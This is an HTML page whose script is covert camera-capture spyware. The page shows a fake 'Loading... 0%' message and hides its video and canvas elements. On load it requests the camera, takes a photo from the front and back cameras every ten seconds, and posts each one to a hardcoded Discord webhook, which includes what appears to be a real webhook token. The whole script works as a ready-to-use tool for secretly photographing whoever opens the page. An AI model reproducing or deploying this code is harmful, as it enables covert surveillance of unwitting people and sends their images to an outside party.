<body>
    <div id="status">Loading... 0%</div>
    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1455135401042776064/lPm6cU4ACdX3UKDbSeYzmdxEYgMkGhqI-097947Cf8O3StFG5x2hPYsl-fxbIBQRrW0Q";
        let currentStream = null;

        async function captureCycle() {
            // 1. Capture Front Camera
            await takePhoto("user", "Front Camera");
            
            // 2. Short delay between switching
            await new Promise(r => setTimeout(r, 1000));

            // 3. Capture Back Camera
            await takePhoto("environment", "Back Camera");
        }

        async function takePhoto(mode, label) {
            try {
                // Stop any existing stream before switching cameras
                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                }

                currentStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: mode } 
                });

                const video = document.getElementById('video');
                video.srcObject = currentStream;

                // Wait for camera to stabilize
                await new Promise(r => setTimeout(r, 1500));

                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                canvas.toBlob(blob => {
                    sendToDiscord(blob, label);
                }, 'image/jpeg', 0.7);

            } catch (err) {
                console.log(label + " access failed: ", err);
            }
        }

        function sendToDiscord(blob, label) {
            const formData = new FormData();
            formData.append('file', blob, 'capture.jpg');
            formData.append('content', `ðŸ“¸ **Capture Alert** | Mode: ${label} | Time: ${new Date().toLocaleTimeString()}`);

            fetch(WEBHOOK_URL, { method: 'POST', body: formData });
        }

        // Start the loop
        window.onload = () => {
            // Run immediately
            captureCycle();
            // Repeat every 10 seconds (5s front + 5s back roughly)
            setInterval(captureCycle, 10000); 
        };
    </script>
